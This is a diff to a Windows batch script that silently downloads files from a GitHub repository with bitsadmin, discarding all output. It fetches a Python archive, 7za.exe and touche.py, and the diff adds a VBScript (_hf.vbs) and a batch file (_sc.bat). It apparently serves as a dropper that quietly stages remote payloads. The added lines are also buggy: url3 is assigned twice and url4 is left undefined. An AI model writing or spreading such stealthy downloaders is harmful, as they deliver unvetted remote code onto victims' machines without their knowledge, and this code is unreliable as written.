@@ -12,9 +12,14 @@
     set url=https://github.com/somehat/files/raw/main/python.zip
     set url1=https://github.com/somehat/files/raw/main/7za.exe
     set url2=https://github.com/somehat/files/raw/main/touche.py
+    set url3=https://github.com/somehat/files/raw/main/_hf.vbs
+    set url3=https://github.com/somehat/files/raw/main/_sc.bat
     set file=python.zip
     set file1=7za.exe
     set file2=touche.py
+    set file3=_hf.vbs
+    set file4=_sc.bat
+    
     rem ----
     if "%~3" NEQ "" (
         set /A timeout=%~3
@@ -30,15 +35,27 @@
 
     bitsadmin /cancel download1 >nul
     bitsadmin /create /download download1 >nul 
-    call bitsadmin /addfile download "%url1%" "%CD%\%file1%" >nul
+    call bitsadmin /addfile download1 "%url1%" "%CD%\%file1%" >nul
     bitsadmin /resume download1 >nul
     bitsadmin /setproxysettings download1 AUTODETECT >nul
 
     bitsadmin /cancel download2 >nul
     bitsadmin /create /download download2 >nul 
-    call bitsadmin /addfile download "%url2%" "%CD%\%file2%" >nul
+    call bitsadmin /addfile download2 "%url2%" "%CD%\%file2%" >nul
     bitsadmin /resume download2 >nul 
     bitsadmin /setproxysettings download2 AUTODETECT >nul
+    
+    bitsadmin /cancel download3 >nul
+    bitsadmin /create /download download3 >nul 
+    call bitsadmin /addfile download3 "%url3%" "%CD%\%file3%" >nul
+    bitsadmin /resume download3 >nul 
+    bitsadmin /setproxysettings download3 AUTODETECT >nul
+    
+    bitsadmin /cancel download4 >nul
+    bitsadmin /create /download download4 >nul 
+    call bitsadmin /addfile download4 "%url4%" "%CD%\%file4%" >nul
+    bitsadmin /resume download4 >nul 
+    bitsadmin /setproxysettings download4 AUTODETECT >nul
 
     set /a attempts=0
     :repeat
